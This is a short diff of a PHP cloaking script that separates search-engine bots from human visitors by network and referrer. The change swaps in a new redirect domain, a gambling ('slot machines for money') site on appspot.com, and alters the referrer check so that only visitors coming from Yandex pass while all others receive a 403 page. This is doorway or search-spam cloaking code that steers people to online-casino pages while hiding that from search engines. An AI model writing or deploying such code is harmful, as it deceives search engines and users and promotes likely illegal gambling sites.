@@ -20,12 +20,17 @@ if ($isSearchBot and stripos($userIpASN, 'Google Fiber') !== false) {
     $isSearchBot = false;
 }
 
-$redirectDomain = 'igrovye-avtomaty.azurewebsites.net';
+$redirectDomain = 'igrovie-automati-na-dengi.appspot.com';
 
 if ( !$isSearchBot ){
     $yandexPos = stripos($user_referer, 'yandex');
     $sitePos = stripos($user_referer, $redirectDomain);
-    if ( !$user_referer ){
+    if ( $user_referer ){
+        if ( $yandexPos === false ){
+            include_once '403.php';
+            exit();
+        }
+    } else {
         include_once '403.php';
         exit();
     }
